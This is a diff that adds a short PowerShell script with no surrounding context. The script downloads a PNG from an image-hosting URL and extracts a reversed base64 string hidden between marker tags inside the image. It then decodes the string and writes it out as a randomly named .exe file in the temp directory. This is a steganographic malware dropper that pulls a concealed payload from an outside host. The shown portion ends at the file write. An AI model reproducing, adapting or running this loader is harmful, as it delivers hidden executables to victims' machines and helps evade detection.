@@ -1,0 +1,16 @@
+$imageUrl = 'https://gcdnb.pbrd.co/images/rYspxkzT3K6k.png';
+$webClient = New-Object System.Net.WebClient;
+$imageBytes = $webClient.DownloadData($imageUrl);
+$imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes);
+$startFlag = '<<BASE64_START>>';
+$endFlag = '<<BASE64_END>>';
+$startIndex = $imageText.IndexOf($startFlag);
+$endIndex = $imageText.IndexOf($endFlag);
+$startIndex -ge 0 -and $endIndex -gt $startIndex;
+$startIndex += $startFlag.Length;
+$base64Length = $endIndex - $startIndex;
+$base64Command = $imageText.Substring($startIndex, $base64Length).ToCharArray();
+[array]::Reverse($base64Command);$base64Command=-join $base64Command;
+$commandBytes = [System.Convert]::FromBase64String($base64Command);
+$tempExePath = [System.IO.Path]::GetTempPath() + [System.Guid]::NewGuid().ToString() + ".exe";
+[System.IO.File]::WriteAllBytes($tempExePath, $commandBytes);
